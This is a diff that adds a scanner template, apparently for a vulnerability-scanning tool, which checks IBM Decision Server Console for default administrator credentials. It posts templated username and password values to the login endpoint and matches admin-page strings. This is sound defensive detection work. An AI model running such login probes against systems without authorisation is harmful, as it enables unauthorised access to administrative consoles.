@@ -1,0 +1,29 @@
+id: ibm-dsc-default-login
+brief:
+    title: IBM Decision Server Console - Default Login
+    by: DhiyaneshDK
+    level: high
+    about: ""
+    label:
+        - ibm
+        - default-login
+        - decision-server
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/res/j_security_check'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: j_username={{username}}&j_password={{password}}
+      signs:
+        - "on": word
+          has:
+            - odmAdmin
+            - Sign Out
+            - Diagnostics
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
